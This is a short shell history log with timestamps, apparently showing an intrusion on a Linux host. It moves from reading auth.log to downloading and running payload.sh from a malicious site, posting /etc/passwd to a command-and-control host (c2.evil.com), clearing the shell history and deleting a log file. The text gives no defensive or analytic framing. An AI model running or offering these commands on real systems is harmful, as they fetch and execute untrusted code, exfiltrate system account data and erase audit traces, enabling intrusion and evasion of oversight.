#1718438400
ls -la
#1718438405
cd /var/log
#1718438410
sudo tail -f auth.log
#1718438500
grep 'Failed password' auth.log > /tmp/failed.log
#1718438600
wget http://malicious-site.com/payload.sh
#1718438605
chmod +x payload.sh
#1718438610
./payload.sh
#1718438700
curl -X POST http://c2.evil.com/beacon -d @/etc/passwd
#1718438800
history -c
#1718438805
rm -rf /tmp/failed.log
